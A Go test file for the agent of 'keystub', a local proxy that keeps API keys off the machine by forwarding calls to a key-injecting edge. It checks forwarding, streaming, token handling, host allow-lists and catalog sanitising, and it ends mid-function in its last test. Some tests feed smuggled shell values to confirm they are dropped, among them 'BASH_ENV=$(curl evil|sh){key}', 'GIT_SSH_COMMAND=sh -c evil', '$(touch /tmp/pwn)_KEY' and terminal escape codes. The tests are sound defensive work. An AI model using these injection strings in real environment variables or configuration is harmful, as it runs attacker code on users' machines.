package agent

import (
	"bufio"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/vivekverma239/keystub/catalog"
	"github.com/vivekverma239/keystub/internal/core"
	"github.com/vivekverma239/keystub/internal/coretest"
	"github.com/vivekverma239/keystub/internal/proxy"
	"github.com/vivekverma239/keystub/internal/reqlog"
)

var bg = context.Background()

const realKey = "real-secret-xyz"

// seen is what reached the edge, before the edge touched it.
type seen struct {
	mu      sync.Mutex
	reqs    []*http.Request
	conns   atomic.Int32
	h2Count atomic.Int32
}

func (s *seen) last() *http.Request {
	s.mu.Lock()
	defer s.mu.Unlock()
	if len(s.reqs) == 0 {
		return nil
	}
	return s.reqs[len(s.reqs)-1]
}

func (s *seen) count() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.reqs)
}

type rig struct {
	engine *core.Engine
	token  string
	home   string
	agent  *Agent
	edge   *httptest.Server
	seen   *seen
	log    *reqlog.Log
}

// newRig runs an upstream for api.echo.test, the Go edge in front of it
// over TLS with HTTP/2 (as the hosted edge will be), and an agent that
// forwards to the edge and holds no keys.
func newRig(t *testing.T, handler http.HandlerFunc) *rig {
	t.Helper()
	up := httptest.NewTLSServer(handler)
	t.Cleanup(up.Close)

	e, _ := coretest.Engine(t, "")
	if err := e.AddService(bg, core.Service{ID: "echo", Name: "Echo", Hosts: []string{"api.echo.test"}, EnvVars: []string{"ECHO_API_KEY"}}); err != nil {
		t.Fatal(err)
	}
	if err := coretest.SetSecret(bg, e, core.DefaultEnv, "echo", realKey); err != nil {
		t.Fatal(err)
	}
	token, _, err := e.CreateToken(bg, core.TokenSpec{EnvID: core.DefaultEnv, Name: "sandbox"})
	if err != nil {
		t.Fatal(err)
	}

	l, _ := reqlog.Open("", 50)
	ed := proxy.NewEdge(e, l)
	upPool := x509.NewCertPool()
	upPool.AddCert(up.Certificate())
	upAddr := up.Listener.Addr().String()
	ed.Upstream = &http.Transport{
		TLSClientConfig: &tls.Config{RootCAs: upPool, ServerName: "example.com"},
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, upAddr) // every host is the test upstream
		},
	}
	s := &seen{}
	es := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.mu.Lock()
		s.reqs = append(s.reqs, r.Clone(context.Background()))
		s.mu.Unlock()
		if r.ProtoMajor == 2 {
			s.h2Count.Add(1)
		}
		ed.ServeHTTP(w, r)
	}))
	es.EnableHTTP2 = true
	es.Config.ConnState = func(_ net.Conn, st http.ConnState) {
		if st == http.StateNew {
			s.conns.Add(1)
		}
	}
	es.StartTLS()
	t.Cleanup(es.Close)

	r := &rig{engine: e, token: token, home: t.TempDir(), edge: es, seen: s, log: l}
	r.agent = r.start(t, token, time.Hour)
	return r
}

func (r *rig) start(t *testing.T, token string, refresh time.Duration) *Agent {
	t.Helper()
	tr := proxy.EdgeTransport()
	tr.TLSClientConfig = &tls.Config{RootCAs: r.edge.Client().Transport.(*http.Transport).TLSClientConfig.RootCAs}
	u, _ := url.Parse(r.edge.URL)
	a, err := Start(bg, Config{Home: r.home, Remote: u, Token: token, Listen: "127.0.0.1:0", Transport: tr, Refresh: refresh, AllowHosts: []string{"api.echo.test", "api.late.test"}})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = a.Close() })
	return a
}

// client sends everything through the agent and trusts only its CA, with
// the token in the proxy URL if given.
func (r *rig) client(t *testing.T, proxyToken string) *http.Client {
	t.Helper()
	pem, err := os.ReadFile(r.agent.CAPath)
	if err != nil {
		t.Fatal(err)
	}
	roots := x509.NewCertPool()
	roots.AppendCertsFromPEM(pem)
	pu := &url.URL{Scheme: "http", Host: r.agent.Addr}
	if proxyToken != "" {
		pu.User = url.UserPassword("keystub", proxyToken)
	}
	return &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(pu), TLSClientConfig: &tls.Config{RootCAs: roots}}}
}

func TestForwardsToTheEdge(t *testing.T) {
	var got *http.Request
	var gotBody string
	r := newRig(t, func(w http.ResponseWriter, req *http.Request) {
		got = req.Clone(context.Background())
		b, _ := io.ReadAll(req.Body)
		gotBody = string(b)
		_, _ = io.WriteString(w, "hello")
	})
	c := r.client(t, "")
	for i := range 2 {
		req, _ := http.NewRequest("POST", "https://api.echo.test/v1/chat?stream=true&n=1", strings.NewReader(`{"i":1}`))
		req.Header.Set("Authorization", "Bearer "+r.token)
		resp, err := c.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 || string(body) != "hello" {
			t.Fatalf("request %d: %d %q", i, resp.StatusCode, body)
		}
	}
	at := r.seen.last()
	if at.URL.Path != "/h/api.echo.test/v1/chat" || at.URL.RawQuery != "stream=true&n=1" || at.Header.Get(proxy.TokenHeader) != "" {
		t.Fatalf("edge saw %s?%s, Keystub-Token %q", at.URL.Path, at.URL.RawQuery, at.Header.Get(proxy.TokenHeader))
	}
	if got.Host != "api.echo.test" || got.URL.Path != "/v1/chat" || got.Header.Get("Authorization") != "Bearer "+realKey || gotBody != `{"i":1}` {
		t.Fatalf("upstream saw host %q path %q auth %q body %q", got.Host, got.URL.Path, got.Header.Get("Authorization"), gotBody)
	}
	// The catalog fetch and both requests shared one HTTP/2 connection.
	if n, h2 := r.seen.conns.Load(), r.seen.h2Count.Load(); n != 1 || int(h2) != r.seen.count() {
		t.Fatalf("%d connections to the edge, %d of %d requests over HTTP/2", n, h2, r.seen.count())
	}
	// The edge logs a call once its response is written, so the second
	// can land just after the client has read it.
	deadline := time.Now().Add(2 * time.Second)
	es := r.log.Recent(5)
	for len(es) < 2 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
		es = r.log.Recent(5)
	}
	if len(es) != 2 || es[0].Key != "sandbox" || es[0].Status != 200 {
		t.Fatalf("edge log = %+v", es)
	}
}

func TestTokenOnlyInProxyAuthGoesInKeystubToken(t *testing.T) {
	var gotAuth string
	r := newRig(t, func(w http.ResponseWriter, req *http.Request) { gotAuth = req.Header.Get("Authorization") })
	resp, err := r.client(t, r.token).Get("https://api.echo.test/v1/models")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 || r.seen.last().Header.Get(proxy.TokenHeader) != r.token || gotAuth != "Bearer "+realKey {
		t.Fatalf("status %d, edge saw Keystub-Token %q, upstream saw %q", resp.StatusCode, r.seen.last().Header.Get(proxy.TokenHeader), gotAuth)
	}

	// With no proxy token, the token in the request is the edge's to find;
	// a Keystub-Token the client wrote is dropped.
	req, _ := http.NewRequest("GET", "https://api.echo.test/v1/models", nil)
	req.Header.Set("Authorization", "Bearer "+r.token)
	req.Header.Set(proxy.TokenHeader, "not-a-token")
	resp, err = r.client(t, "").Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 || r.seen.last().Header.Get(proxy.TokenHeader) != "" {
		t.Fatalf("status %d, edge saw Keystub-Token %q", resp.StatusCode, r.seen.last().Header.Get(proxy.TokenHeader))
	}
}

func TestProxyTokenDecidesAsItDoesLocally(t *testing.T) {
	var gotAuth string
	r := newRig(t, func(_ http.ResponseWriter, req *http.Request) { gotAuth = req.Header.Get("Authorization") })
	old, tk, _ := r.engine.CreateToken(bg, core.TokenSpec{EnvID: core.DefaultEnv, Name: "old"})
	if err := r.engine.RevokeToken(bg, tk.ID); err != nil {
		t.Fatal(err)
	}
	// A stale token in the key variable, the live one in HTTPS_PROXY.
	req, _ := http.NewRequest("GET", "https://api.echo.test/v1/models", nil)
	req.Header.Set("Authorization", "Bearer "+old)
	resp, err := r.client(t, r.token).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 || gotAuth != "Bearer "+realKey || r.seen.last().Header.Get(proxy.TokenHeader) != r.token {
		t.Fatalf("status %d, upstream saw %q", resp.StatusCode, gotAuth)
	}
	if es := r.log.Recent(1); len(es) != 1 || es[0].Key != "sandbox" {
		t.Fatalf("edge logged %+v", es)
	}
}

func TestClientConnectionCloseKeepsTheEdgeConnection(t *testing.T) {
	r := newRig(t, func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "ok") })
	c := r.client(t, r.token)
	for range 3 {
		req, _ := http.NewRequest("GET", "https://api.echo.test/v1/models", nil)
		req.Close = true // Connection: close, as curl -H or a one-shot CLI sends
		resp, err := c.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 {
			t.Fatalf("status %d", resp.StatusCode)
		}
	}
	if n := r.seen.conns.Load(); n != 1 {
		t.Fatalf("%d connections to the edge, want 1", n)
	}
}

func TestStrayTokenNeverLeavesTheBox(t *testing.T) {
	r := newRig(t, func(http.ResponseWriter, *http.Request) { t.Error("request reached upstream") })
	before := r.seen.count()
	req, _ := http.NewRequest("POST", "https://api.echo.test/v1/charges", nil)
	req.Header.Set("Authorization", "Bearer "+r.token)
	req.Header.Set("Idempotency-Key", r.token)
	resp, err := r.client(t, "").Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest || r.seen.count() != before {
		t.Fatalf("status %d, edge got %d requests", resp.StatusCode, r.seen.count()-before)
	}
}

func TestEdgeRefusalsPassThrough(t *testing.T) {
	r := newRig(t, func(http.ResponseWriter, *http.Request) { t.Error("request reached upstream") })
	req, _ := http.NewRequest("GET", "https://api.echo.test/v1/models", nil)
	req.Header.Set("Authorization", "Bearer sk-stub-0000000000000000000000000000000000ff")
	resp, err := r.client(t, "").Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var e struct {
		Error struct{ Type, Message string } `json:"error"`
	}
	_ = json.NewDecoder(resp.Body).Decode(&e)
	if resp.StatusCode != http.StatusUnauthorized || e.Error.Type != "keystub" {
		t.Fatalf("status %d, body %+v", resp.StatusCode, e)
	}
}

func TestNoKeysOnTheBox(t *testing.T) {
	r := newRig(t, func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "ok") })
	resp, err := r.client(t, r.token).Get("https://api.echo.test/v1/models")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("status %d", resp.StatusCode)
	}
	// The agent's home holds its CA and nothing else: no state, master
	// key, admin token or request log, and the real key appears nowhere.
	var names []string
	err = filepath.WalkDir(r.home, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		names = append(names, d.Name())
		b, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		if strings.Contains(string(b), realKey) || strings.Contains(string(b), r.token) {
			t.Errorf("%s holds a key or token", d.Name())
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, n := range names {
		switch n {
		case "ca.pem", "ca-key.pem", "ca-bundle.pem", "ca.lock":
		default:
			t.Errorf("unexpected file %s in the agent's home", n)
		}
	}
	if s, ok := r.agent.hosts.ServiceForHost("api.echo.test"); !ok || s.ID != "echo" {
		t.Fatalf("agent catalog = %+v", s)
	}
}

func TestStreamsThroughTheEdge(t *testing.T) {
	release := make(chan struct{})
	r := newRig(t, func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		_, _ = io.WriteString(w, "data: first\n\n")
		w.(http.Flusher).Flush()
		select { // the client must see the first event before we send the rest
		case <-release:
		case <-time.After(5 * time.Second):
			return
		}
		_, _ = io.WriteString(w, "data: second\n\n")
	})
	resp, err := r.client(t, r.token).Get("https://api.echo.test/stream")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	br := bufio.NewReader(resp.Body)
	line, err := br.ReadString('\n')
	if err != nil || line != "data: first\n" {
		t.Fatalf("first line %q, %v", line, err)
	}
	close(release)
	rest, _ := io.ReadAll(br)
	if !strings.Contains(string(rest), "data: second") {
		t.Fatalf("rest = %q", rest)
	}
}

func TestExpectContinueThroughTheEdge(t *testing.T) {
	var got int
	r := newRig(t, func(_ http.ResponseWriter, req *http.Request) {
		b, _ := io.ReadAll(req.Body)
		got = len(b)
	})
	c := r.client(t, r.token)
	c.Transport.(*http.Transport).ExpectContinueTimeout = 5 * time.Second
	req, _ := http.NewRequest("POST", "https://api.echo.test/upload", strings.NewReader(strings.Repeat("x", 1<<20)))
	req.Header.Set("Expect", "100-continue")
	start := time.Now()
	resp, err := c.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if took := time.Since(start); took > 3*time.Second {
		t.Fatalf("upload waited %v for 100 Continue", took)
	}
	if resp.StatusCode != 200 || got != 1<<20 {
		t.Fatalf("status %d, upstream got %d bytes", resp.StatusCode, got)
	}
}

func TestWebsocketThroughTheEdge(t *testing.T) {
	var gotAuth string
	r := newRig(t, func(w http.ResponseWriter, req *http.Request) {
		gotAuth = req.Header.Get("Authorization")
		if req.Header.Get("Upgrade") != "websocket" {
			http.Error(w, "want upgrade", 400)
			return
		}
		conn, brw, err := w.(http.Hijacker).Hijack()
		if err != nil {
			return
		}
		defer conn.Close()
		_, _ = io.WriteString(conn, "HTTP/1.1 101 Switching Protocols\r\nConnection: Upgrade\r\nUpgrade: websocket\r\n\r\n")
		line, _ := brw.ReadString('\n')
		_, _ = io.WriteString(conn, "echo "+line)
	})
	req, _ := http.NewRequest("GET", "https://api.echo.test/ws", nil)
	req.Header.Set("Connection", "Upgrade")
	req.Header.Set("Upgrade", "websocket")
	resp, err := r.client(t, r.token).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	if resp.StatusCode != http.StatusSwitchingProtocols {
		b, _ := io.ReadAll(resp.Body)
		t.Fatalf("status %d %s", resp.StatusCode, b)
	}
	rwc := resp.Body.(io.ReadWriteCloser)
	defer rwc.Close()
	_, _ = io.WriteString(rwc, "ping\n")
	line, err := bufio.NewReader(rwc).ReadString('\n')
	if err != nil || line != "echo ping\n" {
		t.Fatalf("got %q, %v", line, err)
	}
	if gotAuth != "Bearer "+realKey {
		t.Fatalf("upstream saw %q", gotAuth)
	}
}

func TestOtherHostsAreTunnelled(t *testing.T) {
	r := newRig(t, func(http.ResponseWriter, *http.Request) {})
	other := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = io.WriteString(w, "direct") }))
	defer other.Close()
	before := r.seen.count()
	c := r.client(t, r.token)
	c.Transport.(*http.Transport).TLSClientConfig.RootCAs.AddCert(other.Certificate())
	resp, err := c.Get(other.URL)
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if string(b) != "direct" || r.seen.count() != before {
		t.Fatalf("got %q, edge got %d requests", b, r.seen.count()-before)
	}
}

func TestCatalogRefreshes(t *testing.T) {
	r := newRig(t, func(w http.ResponseWriter, _ *http.Request) {})
	a := r.start(t, r.token, 20*time.Millisecond)
	if len(a.Catalog.Services) != 1 {
		t.Fatalf("catalog = %+v", a.Catalog)
	}
	if _, ok := a.hosts.ServiceForHost("api.late.test"); ok {
		t.Fatal("decrypting a host before the server has it")
	}
	if err := r.engine.AddService(bg, core.Service{ID: "late", Name: "Late", Hosts: []string{"api.late.test"}}); err != nil {
		t.Fatal(err)
	}
	time.Sleep(100 * time.Millisecond) // a few refreshes: no key in the env yet, so not decrypted
	if _, ok := a.hosts.ServiceForHost("api.late.test"); ok {
		t.Fatal("decrypting a host whose service has no key in the token's env")
	}
	if err := coretest.SetSecret(bg, r.engine, core.DefaultEnv, "late", "real-late"); err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(2 * time.Second)
	for {
		if _, ok := a.hosts.ServiceForHost("api.late.test"); ok {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("the agent never picked up the new service")
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func TestStartRefuses(t *testing.T) {
	r := newRig(t, func(http.ResponseWriter, *http.Request) {})
	u, _ := url.Parse(r.edge.URL)
	tr := proxy.EdgeTransport()
	tr.TLSClientConfig = &tls.Config{RootCAs: r.edge.Client().Transport.(*http.Transport).TLSClientConfig.RootCAs}
	for name, cfg := range map[string]Config{
		"unknown token":               {Home: t.TempDir(), Remote: u, Token: "sk-stub-0000000000000000000000000000000000ff", Listen: "127.0.0.1:0", Transport: tr},
		"no token":                    {Home: t.TempDir(), Remote: u, Listen: "127.0.0.1:0", Transport: tr},
		"off loopback":                {Home: t.TempDir(), Remote: u, Token: r.token, Listen: "0.0.0.0:0", Transport: tr},
		"not an edge":                 {Home: t.TempDir(), Remote: &url.URL{Scheme: "ftp", Host: "x"}, Token: r.token, Listen: "127.0.0.1:0", Transport: tr},
		"query":                       {Home: t.TempDir(), Remote: &url.URL{Scheme: "https", Host: u.Host, RawQuery: "x=1"}, Token: r.token, Listen: "127.0.0.1:0", Transport: tr},
		"user":                        {Home: t.TempDir(), Remote: &url.URL{Scheme: "https", Host: u.Host, User: url.User("me")}, Token: r.token, Listen: "127.0.0.1:0", Transport: tr},
		"edge not there":              {Home: t.TempDir(), Remote: &url.URL{Scheme: "http", Host: "127.0.0.1:1"}, Token: r.token, Listen: "127.0.0.1:0"},
		"plain HTTP off this machine": {Home: t.TempDir(), Remote: &url.URL{Scheme: "http", Host: "10.0.0.5:8789"}, Token: r.token, Listen: "127.0.0.1:0"},
	} {
		if a, err := Start(bg, cfg); err == nil {
			a.Close()
			t.Errorf("%s: started", name)
		}
	}
}

func TestNoTokenNeverLeavesTheBox(t *testing.T) {
	r := newRig(t, func(http.ResponseWriter, *http.Request) { t.Error("request reached upstream") })
	before := r.seen.count()
	// The box's own credential for the host, and no proxy token anywhere.
	req, _ := http.NewRequest("GET", "https://api.echo.test/repo.git/info/refs", nil)
	req.SetBasicAuth("me", "ghp_my_own_real_token")
	resp, err := r.client(t, "").Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusUnauthorized || r.seen.count() != before {
		t.Fatalf("status %d, edge got %d requests", resp.StatusCode, r.seen.count()-before)
	}
}

func TestOnlyTrustedHostsAreDecrypted(t *testing.T) {
	h := &hosts{trusted: trustedHosts([]string{"api.internal.example", "*.corp.example"})}
	cat, ignored := h.set(proxy.CatalogResponse{Services: []proxy.CatalogService{
		// A custom service on the edge naming hosts the box never agreed to.
		{ID: "custom", Name: "Custom", Hosts: []string{"github.com", "registry.npmjs.org"}, EnvVars: []string{"CUSTOM_KEY"}},
		{ID: "tld", Name: "TLD", Hosts: []string{"*.com"}},
		{ID: "suffix", Name: "Suffix", Hosts: []string{"*.co.uk"}},
		{ID: "github", Name: "GitHub", Hosts: []string{"github.com"}},
		// Half trusted: keeps only the catalog's host.
		{ID: "openai", Name: "OpenAI", Hosts: []string{"api.openai.com", "evil.example"}, EnvVars: []string{"OPENAI_API_KEY"}},
		{ID: "pinecone", Name: "Pinecone", Hosts: []string{"*.pinecone.io"}},
		{ID: "internal", Name: "Internal", Hosts: []string{"api.internal.example"}},
		{ID: "corp", Name: "Corp", Hosts: []string{"*.build.corp.example"}},
	}})
	for host, want := range map[string]string{
		"registry.npmjs.org": "", "bank.co.uk": "", "evil.example": "",
		"api.openai.com": "openai", "idx-1.svc.pinecone.io": "pinecone", "github.com": "github",
		"api.internal.example": "internal", "x.build.corp.example": "corp",
	} {
		s, _ := h.ServiceForHost(host)
		if s.ID != want {
			t.Errorf("%s: decrypted as %q, want %q", host, s.ID, want)
		}
	}
	var ids []string
	for _, s := range cat.Services {
		ids = append(ids, s.ID)
	}
	// What callers see lists only what's decrypted, so `keystub run` sets
	// no CUSTOM_KEY for a host the agent tunnels.
	if !slices.Equal(ids, []string{"github", "openai", "pinecone", "internal", "corp"}) || !slices.Equal(cat.Services[1].Hosts, []string{"api.openai.com"}) {
		t.Fatalf("catalog kept %+v", cat.Services)
	}
	if !slices.Equal(ignored, []string{"github.com (only as github)", "registry.npmjs.org (only as npm)", "*.com", "*.co.uk", "evil.example"}) {
		t.Fatalf("ignored = %v, so the user isn't told", ignored)
	}
}

func TestCovers(t *testing.T) {
	for _, c := range []struct {
		t, host string
		ok      bool
	}{
		{"api.openai.com", "api.openai.com", true},
		{"api.openai.com", "*.openai.com", false},
		{"*.pinecone.io", "*.pinecone.io", true},
		{"*.pinecone.io", "a.pinecone.io", true},
		{"*.pinecone.io", "*.a.pinecone.io", true},
		{"*.pinecone.io", "pinecone.io", false},
		{"*.pinecone.io", "evilpinecone.io", false},
		{"*.pinecone.io", "*.io", false},
	} {
		if got := covers(c.t, c.host); got != c.ok {
			t.Errorf("covers(%s, %s) = %v", c.t, c.host, got)
		}
	}
}

func TestRealCredentialStaysOnTheBox(t *testing.T) {
	r := newRig(t, func(http.ResponseWriter, *http.Request) { t.Error("request reached upstream") })
	for name, v := range map[string]string{
		"bearer":     "Bearer sk-proj-my-own-real-key",
		"bare":       "my-own-real-key",
		"basic auth": "Basic bWU6Z2hwX215X293bl9yZWFsX3Rva2Vu",
	} {
		before := r.seen.count()
		req, _ := http.NewRequest("POST", "https://api.echo.test/v1/chat", strings.NewReader("{}"))
		req.Header.Set("Authorization", v)
		resp, err := r.client(t, r.token).Do(req) // keystub run: a token in Proxy-Authorization
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != http.StatusBadRequest || !strings.Contains(string(b), "real credential") || r.seen.count() != before {
			t.Errorf("%s: status %d %s, edge got %d requests", name, resp.StatusCode, b, r.seen.count()-before)
		}
	}
}

func TestTheEdgeDoesntChooseTheEnvironment(t *testing.T) {
	cat := clean(proxy.CatalogResponse{Services: []proxy.CatalogService{
		// A built-in service: header, variables and base URL come from the
		// built-in catalog, whatever the edge says.
		{ID: "anthropic", Name: "Anthropic", Hosts: []string{"api.anthropic.com"}, Header: "X-Nothing",
			EnvVars: []string{"BASH_ENV=$(curl evil|sh){key}"}, BaseURL: core.BaseURL{Var: "NODE_OPTIONS", Path: "/x"}},
		// A custom one may name only key and URL variables.
		{ID: "custom", Name: "Custom", Hosts: []string{"api.internal.example"},
			EnvVars: []string{"CUSTOM_API_KEY", "GIT_SSH_COMMAND=sh -c evil #{key}", "HTTPS_PROXY", "KEYSTUB_KEY", "STUBKEY_TOKEN", "_KEY"},
			BaseURL: core.BaseURL{Var: "BASH_ENV"}},
		{ID: "custom2", Name: "Custom2", Hosts: []string{"api2.internal.example"}, BaseURL: core.BaseURL{Var: "CUSTOM2_BASE_URL"}},
	}})
	a := cat.Services[0]
	if a.Header != "x-api-key" || !slices.Equal(a.EnvVars, []string{"ANTHROPIC_API_KEY"}) || a.BaseURL.Var != "ANTHROPIC_BASE_URL" {
		t.Fatalf("built-in service kept the edge's settings: %+v", a)
	}
	c := cat.Services[1]
	if !slices.Equal(c.EnvVars, []string{"CUSTOM_API_KEY"}) || c.BaseURL.Var != "" {
		t.Fatalf("custom service kept %+v", c)
	}
	if cat.Services[2].BaseURL.Var != "" {
		t.Fatalf("a custom service set a base URL (PIP_INDEX_URL could serve code): %+v", cat.Services[2])
	}
	if !slices.Equal(cat.Dropped, []string{"Custom: GIT_SSH_COMMAND", "Custom: HTTPS_PROXY", "Custom: KEYSTUB_KEY", "Custom: STUBKEY_TOKEN", "Custom: _KEY"}) {
		t.Fatalf("dropped = %v", cat.Dropped)
	}
	// The box guards the built-in header, so a real key there stays home.
	h := &hosts{trusted: trustedHosts(nil)}
	h.set(cat)
	if s, ok := h.ServiceForHost("api.anthropic.com"); !ok || s.Header != "x-api-key" {
		t.Fatalf("decrypted as %+v", s)
	}
}

func TestAllowHostIsChecked(t *testing.T) {
	for h, ok := range map[string]bool{
		"api.internal.example": true, "*.corp.example": true,
		"*.com": false, "https://api.x.com": false, "api.x.com:443": false, "api.x.com/v1": false, "": false,
	} {
		if err := checkAllowHost(h); (err == nil) != ok {
			t.Errorf("%q: %v", h, err)
		}
	}
	r := newRig(t, func(http.ResponseWriter, *http.Request) {})
	u, _ := url.Parse(r.edge.URL)
	if a, err := Start(bg, Config{Home: t.TempDir(), Remote: u, Token: r.token, Listen: "127.0.0.1:0", AllowHosts: []string{"*.com"}}); err == nil {
		a.Close()
		t.Fatal("started with --allow-host *.com")
	}
}

func TestRefreshWarnsAboutNewlyIgnoredHosts(t *testing.T) {
	pr, pw, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	old := os.Stderr
	os.Stderr = pw
	r := newRig(t, func(http.ResponseWriter, *http.Request) {})
	a := r.start(t, r.token, 20*time.Millisecond)
	if err := r.engine.AddService(bg, core.Service{ID: "sneaky", Name: "Sneaky", Hosts: []string{"api.untrusted.test"}}); err != nil {
		t.Fatal(err)
	}
	if err := coretest.SetSecret(bg, r.engine, core.DefaultEnv, "sneaky", "real"); err != nil {
		t.Fatal(err)
	}
	time.Sleep(150 * time.Millisecond) // several refreshes; it's named once
	a.Close()
	os.Stderr = old
	pw.Close()
	out, _ := io.ReadAll(pr)
	if strings.Count(string(out), "api.untrusted.test") != 1 {
		t.Fatalf("stderr:\n%s", out)
	}
	if _, ok := a.hosts.ServiceForHost("api.untrusted.test"); ok {
		t.Fatal("decrypting a host the box never allowed")
	}
}

func TestCleanNormalizesFirst(t *testing.T) {
	cat := clean(proxy.CatalogResponse{Services: []proxy.CatalogService{
		// A built-in ID in another case or with spaces is still built in.
		{ID: " Anthropic", Name: "Anthropic", Hosts: []string{"API.anthropic.com."}, Header: "X-Nothing",
			EnvVars: []string{"ANTHROPIC_API_KEY=x{key}"}, BaseURL: core.BaseURL{Var: "PIP_INDEX_URL"}},
		// Names that aren't variable names never reach `export`.
		{ID: "evil", Name: "Evil\x1b[2J", Hosts: []string{"api.evil.example"}, EnvVars: []string{"$(touch /tmp/pwn)_KEY", "`id`_TOKEN"}},
		{ID: "bad id!", Name: "Bad", Hosts: []string{"api.bad.example"}},
	}})
	if len(cat.Services) != 2 {
		t.Fatalf("services = %+v", cat.Services)
	}
	a := cat.Services[0]
	if a.ID != "anthropic" || a.Header != "x-api-key" || !slices.Equal(a.EnvVars, []string{"ANTHROPIC_API_KEY"}) || a.BaseURL.Var != "ANTHROPIC_BASE_URL" || !slices.Equal(a.Hosts, []string{"api.anthropic.com"}) {
		t.Fatalf("built-in kept the edge's settings: %+v", a)
	}
	e := cat.Services[1]
	if len(e.EnvVars) != 0 || strings.ContainsRune(e.Name, 0x1b) {
		t.Fatalf("evil kept %+v", e)
	}
	h := &hosts{trusted: trustedHosts(nil)}
	h.set(cat)
	if s, ok := h.ServiceForHost("api.anthropic.com"); !ok || s.Header != "x-api-key" {
		t.Fatalf("decrypted as %+v", s)
	}
}

func TestBuiltInHostsStayWithTheirService(t *testing.T) {
	h := &hosts{trusted: trustedHosts([]string{"*.googleapis.com"})}
	cat, ignored := h.set(clean(proxy.CatalogResponse{Services: []proxy.CatalogService{
		{ID: "evil", Name: "Evil", Hosts: []string{"generativelanguage.googleapis.com", "*.googleapis.com"}, Header: "X-Nothing"},
		{ID: "gemini", Name: "Gemini", Hosts: []string{"generativelanguage.googleapis.com"}},
	}}))
	if !slices.Equal(ignored, []string{"generativelanguage.googleapis.com (only as gemini)"}) || len(cat.Services) != 2 {
		t.Fatalf("ignored %v, kept %+v", ignored, cat.Services)
	}
	if s, ok := h.ServiceForHost("generativelanguage.googleapis.com"); !ok || s.ID != "gemini" || s.Header != "x-goog-api-key" {
		t.Fatalf("served as %+v", s)
	}
	if s, ok := h.ServiceForHost("internal.googleapis.com"); !ok || s.ID != "evil" {
		t.Fatalf("the box's own host: %+v %v", s, ok)
	}
	// Without the built-in service, its host is tunnelled untouched.
	h.set(clean(proxy.CatalogResponse{Services: []proxy.CatalogService{{ID: "evil", Name: "Evil", Hosts: []string{"*.googleapis.com"}}}}))
	if s, ok := h.ServiceForHost("generativelanguage.googleapis.com"); ok {
		t.Fatalf("decrypted as %+v", s)
	}
}

func TestCustomServicesCantTakeBuiltInVariables(t *testing.T) {
	for _, v := range []string{"GITHUB_TOKEN", "NPM_TOKEN", "openai_api_key"} {
		if keyVar(v) {
			t.Errorf("%s allowed", v)
		}
	}
	if !keyVar("ACME_API_KEY") {
		t.Error("ACME_API_KEY refused")
	}
	if printable("a‮b\x1bc") != "abc" {
		t.Error("format characters kept")
	}
}

func TestEdgeErrorsArePrintable(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusUnauthorized)
		fmt.Fprint(w, `{"error":{"message":"bad \u001b[2Jtoken"}}`)
	}))
	defer srv.Close()
	u, _ := url.Parse(srv.URL)
	_, err := FetchCatalog(bg, http.DefaultTransport, u, "sk-stub-x")
	if err == nil || strings.ContainsRune(err.Error(), 0x1b) || !strings.Contains(err.Error(), "bad [2Jtoken") {
		t.Fatalf("err = %v", err)
	}
}

func TestCustomWildcardUnderABuiltInIsDropped(t *testing.T) {
	h := &hosts{trusted: trustedHosts([]string{"*.twilio.com", "*.example.com"})}
	cat, ignored := h.set(clean(proxy.CatalogResponse{Services: []proxy.CatalogService{
		{ID: "acme", Name: "Acme", Hosts: []string{"*.twilio.com", "*.example.com"}, EnvVars: []string{"ACME_TOKEN"}},
		{ID: "gw", Name: "Gw", Hosts: []string{"*.twilio.com"}, EnvVars: []string{"GW_TOKEN"}},
	}}))
